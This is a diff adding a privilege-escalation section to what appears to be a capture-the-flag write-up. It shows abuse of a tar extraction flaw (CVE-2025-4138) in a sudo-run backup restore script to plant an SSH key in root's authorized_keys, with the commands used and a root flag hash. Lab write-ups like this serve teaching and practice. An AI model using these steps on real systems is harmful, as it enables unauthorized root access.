@@ -249,3 +249,45 @@ here we got the password of the wacky user only so i was unable to execute the c
 <img width="1213" height="136" alt="Screenshot 2026-04-18 at 18 25 13" src="https://github.com/user-attachments/assets/f2c9a332-2aec-4c6f-ae18-825e07eea9a6" />
 
 
+in the script there is a part ::
+
+```
+with tarfile.open(backup_path, "r") as tar:
+    tar.extractall(path=staging_dir, filter="data")
+```
+
+using the exploit of cve 2025-4138 we create an exploit script.
+
+
+
+generated a public and private key so that we can plant this key in the .ssh/authorized_keys which will help us to get the root access.
+
+<img width="675" height="396" alt="Screenshot 2026-04-22 at 11 20 33" src="https://github.com/user-attachments/assets/6ae104bb-3d08-464b-b5de-88a4d8debb7a" />
+
+now we are going to implant this keys in the authorized_keys files to get the root permissions for that key.
+
+<img width="1269" height="90" alt="Screenshot 2026-04-22 at 11 23 05" src="https://github.com/user-attachments/assets/34e0b09e-d13f-45d2-ab5e-6a913c08e06d" />
+
+```
+python3 /tmp/exploit_cve.py -o /opt/backup_clients/backups/backup_1001.tar -p ssh-key -P /tmp/rootkey.pub
+```
+this will create a tar file in the backup directory and this file puts the public key from the rootkey.pub to the tar file.
+
+```
+sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_evil
+```
+
+now the tar that we created in the backup directory is executed as the sudo user so it will now write our public key in the authorized_keys file .
+
+now running ssh using the private key that we made before and saved in the rootkey file.
+
+```
+ssh -i /tmp/rootkey root@localhost
+```
+
+<img width="593" height="91" alt="Screenshot 2026-04-22 at 11 35 04" src="https://github.com/user-attachments/assets/a0ff150b-4a10-465e-a488-259858a6c73e" />
+
+
+root key ::
+
+### 779f965eb2f45aeda1c2943d3da16bc6
